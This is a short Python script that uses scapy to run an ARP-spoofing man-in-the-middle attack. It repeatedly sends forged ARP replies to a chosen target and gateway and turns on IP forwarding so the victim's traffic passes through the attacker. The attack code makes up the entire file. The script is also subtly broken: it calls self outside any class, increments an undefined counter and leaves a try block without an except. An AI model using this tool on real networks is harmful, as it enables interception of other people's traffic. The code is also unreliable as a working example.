import scapy.all as scapy
import time
import argparse

parser = argparse.ArgumentParser()                                               
parser.add_argument('-t', help="IP of the target", required=True)
parser.add_argument('-g', help="IP of the gateway", required=True)
args = parser.parse_args()

target_ip = (args.t)
gateway_ip = (args.g)
  
def get_mac(ip): # Get victim's MAC with the answers to the ARP request
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
    arp_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_broadcast, timeout = 5, verbose = False)[0]
    return answered_list[0][1].hwsrc 
  
def spoof(target_ip, spoof_ip): # Build and send packet with obtained MAC and user input as parameters 
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip), psrc = spoof_ip)
    scapy.send(packet, verbose = False) 

def check_ipv4_forwarding(self, config='/proc/sys/net/ipv4/ip_forward'): # Enable IPv4 forwarding to not block the target while poisoning.
    with open(config, mode='r+', encoding='utf_8') as config_file:
        line = next(config_file)
        config_file.seek(0)
        config_file.write(line.replace('0', '1'))
  
try: # Launch ARP Spoofing until keyboard interrupt 
    packets_count = 0
    self.check_ipv4_forwarding()
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2 # Sent packets counter 
        print("\r[*] Packets Sent "+str(packets_count), end ="")
        time.sleep(5) # Waits for five seconds before sending again
